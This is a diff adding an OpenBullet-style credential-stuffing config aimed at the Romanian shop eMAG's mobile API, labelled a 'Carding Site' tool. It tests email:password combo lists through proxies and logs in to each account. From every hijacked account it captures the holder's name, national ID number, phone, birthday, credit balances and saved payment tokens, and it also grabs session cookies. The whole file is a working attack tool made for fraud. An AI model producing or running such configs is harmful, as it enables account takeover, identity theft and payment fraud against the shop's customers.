@@ -1,0 +1,179 @@
+[SETTINGS]
+{
+  "Name": "Emag.ro iOS Api (Carding Site)",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-17T05:37:27.2906648+04:00",
+  "AdditionalInfo": "Romanian Shopping Combo | Full Capture | Made by @YashvirGamingAdmin",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#  ██╗   ██╗ █████╗ ███████╗██╗  ██╗██╗   ██╗██╗██████╗      ██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗ 
+#  ╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║██║   ██║██║██╔══██╗    ██╔════╝ ██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ 
+#   ╚████╔╝ ███████║███████╗███████║██║   ██║██║██████╔╝    ██║  ███╗███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗
+#    ╚██╔╝  ██╔══██║╚════██║██╔══██║╚██╗ ██╔╝██║██╔══██╗    ██║   ██║██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
+#     ██║   ██║  ██║███████║██║  ██║ ╚████╔╝ ██║██║  ██║    ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
+#     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+#                                                                                                             
+
+#LOGIN REQUEST POST "https://m-api.emag.ro/v2.0/user/login" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: m-api.emag.ro" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "X-App-Screen-Id: 75c7e507-64cf-4bea-870f-fd4c7ea5795e" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Ab-Tests-Auto: {\"tgt_eabapp2\":\"A\",\"badge_super_price_realtime\":\"b\"}" 
+  HEADER "X-Request-Source: mobile-app" 
+  HEADER "User-Agent: eMAG/3.9.7 (iPhone; iOS 15.3.1; Alamofire; 750x1334)" 
+  HEADER "Content-Length: 55" 
+  HEADER "X-App-Version: iOS-3.9.7" 
+  HEADER "X-Tokens: eyJ1c2VyX2lkIjoyMjA3NTEwODU0ODU1MDg1NjM4LCJsYW5nX2NvZGVfa2V5IjoidzVzUllzT0ZaSG5DdWNLNnc1SENzSHhzSzBIQ2lzTzRJOE9ZSTJcL0R2UWx6UU1PaXdyTVd3NklhdzVKemRNT053b2ZDaXl6Q3JzS1FMeE1FdzdUQ3BpWjllTUszVUJURHZrQmxid2ZEdGszRG1pUkt3cHJEaHNLOUZzTzVKc09wRThLYXdwRUFKVGcyVDhLeEd3VWRYTU84IiwidXVpZCI6IjE2NDc0NzkwMjEtODQ1OTcyMTk5LTM5ODY0IiwiZGlkIjoiMjc3MWRkOGQtMjQ4Ny00YzE5LWIxNzUtNGI2MTk0ZWZhMWFlIn0=" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":400" 
+    KEY "\"success\":false" 
+    KEY "Adresa de email sau parola introdus\\u0103 nu este corect\\u0103!" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true" 
+
+#TOKEN PARSE "<SOURCE>" LR "\"tokens\":\"" "\"" -> VAR "TOKEN" 
+
+#GET_USER REQUEST GET "https://m-api.emag.ro/v2.0/user/details" 
+  
+  HEADER "Host: m-api.emag.ro" 
+  HEADER "Accept: */*" 
+  HEADER "X-Tokens: <TOKEN>" 
+  HEADER "X-Request-Source: mobile-app" 
+  HEADER "X-Ab-Tests-Auto: {\"tgt_eabapp2\":\"A\",\"badge_super_price_realtime\":\"b\"}" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-App-Screen-Id: 75c7e507-64cf-4bea-870f-fd4c7ea5795e" 
+  HEADER "User-Agent: eMAG/3.9.7 (iPhone; iOS 15.3.1; Alamofire; 750x1334)" 
+  HEADER "X-App-Version: iOS-3.9.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#ID PARSE "<SOURCE>" LR "data\":{\"id\":\"" "\"" -> VAR "ID" 
+
+#Fullname PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Fullname" 
+
+#IDNumber PARSE "<SOURCE>" JSON "national_identification_number" CreateEmpty=FALSE -> CAP "IDNumber" 
+
+#Phone PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Phone" 
+
+#Sex PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "Sex" 
+
+#DOB PARSE "<SOURCE>" JSON "birthday" CreateEmpty=FALSE -> CAP "DOB" 
+
+#Education_Level PARSE "<SOURCE>" JSON "education_level" CreateEmpty=FALSE -> CAP "Education Level" 
+
+#Date_registered PARSE "<SOURCE>" LR "\"created_on\":\"" "T" CreateEmpty=FALSE -> CAP "Date registered" 
+
+#Credits-Total PARSE "<SOURCE>" LR "\"emag_pay_credit\":{\"total\":" "," CreateEmpty=FALSE -> CAP "Credits-Total" 
+
+#Available_Credits PARSE "<SOURCE>" JSON "available" CreateEmpty=FALSE -> CAP "Available Credits" 
+
+#Bnp12_Credits PARSE "<SOURCE>" JSON "bnpl2_available" CreateEmpty=FALSE -> CAP "Bnp12 Credits" 
+
+#Subscription_Status PARSE "<SOURCE>" LR "subscription\":{\"is_active\":" "," CreateEmpty=FALSE -> CAP "Subscription Status" 
+
+#CHECK_SUBSCRIPTION KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "subscription\":{\"is_active\":null" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"linked_accounts\":[]" 
+    KEY "subscription\":{\"is_active\":null" 
+
+#GET_PAYMENT REQUEST GET "https://m-api.emag.ro/v2.0/payment/tokens" 
+  
+  HEADER "Host: m-api.emag.ro" 
+  HEADER "Accept: */*" 
+  HEADER "X-Tokens: <TOKEN>" 
+  HEADER "X-Request-Source: mobile-app" 
+  HEADER "X-Ab-Tests-Auto: {\"tgt_eabapp2\":\"A\",\"badge_super_price_realtime\":\"b\"}" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-App-Screen-Id: 75c7e507-64cf-4bea-870f-fd4c7ea5795e" 
+  HEADER "User-Agent: eMAG/3.9.7 (iPhone; iOS 15.3.1; Alamofire; 750x1334)" 
+  HEADER "X-App-Version: iOS-3.9.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CHECK_PAYMENT KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "data\":[]" 
+
+#POST_securelogin REQUEST POST "https://m.emag.ro/mobileApp/securelogin" 
+  CONTENT "apiVersion=0.0&tokens=<TOKEN>&next=https%3A//www.emag.ro/user/card-emag" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: m.emag.ro" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: null" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Mozilla/5.0 (eMAG/3.9.7 (iPhone; iOS 15.3.1; Alamofire; 750x1334))" 
+  HEADER "Content-Length: 1032" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Redirecting to " 
+    KEY "Redirecting to <a href=\"https://www.emag.ro/user/card-emag" 
+    KEY "<COOKIES{*}>" Contains "user_token" 
+    KEY "<RESPONSECODE>" Contains "302" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<COOKIES{*}>" DoesNotContain "user_token" 
+    KEY "<SOURCE>" DoesNotContain "Redirecting to " 
+
+#utoken PARSE "<COOKIES(user_token)>" LR "" "" -> VAR "utoken" 
+
+#GET_INVOICE REQUEST GET "https://m-api.emag.ro/v2.0/companies" 
+  
+  HEADER "Host: m-api.emag.ro" 
+  HEADER "Accept: */*" 
+  HEADER "X-Tokens: <TOKEN>" 
+  HEADER "X-Request-Source: mobile-app" 
+  HEADER "X-Ab-Tests-Auto: {\"tgt_eabapp2\":\"A\",\"badge_super_price_realtime\":\"b\"}" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-App-Screen-Id: a5d99ada-0494-4e82-8bc5-4aaab7be4ed0" 
+  HEADER "User-Agent: eMAG/3.9.7 (iPhone; iOS 15.3.1; Alamofire; 750x1334)" 
+  HEADER "X-App-Version: iOS-3.9.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "{\"code\":200,\"data\":[{" 
+    KEY "{\"code\":200,\"data\":[{\"" 
+    KEY "{\"code\":200,\"data\":[\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"code\":200,\"data\":[]" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
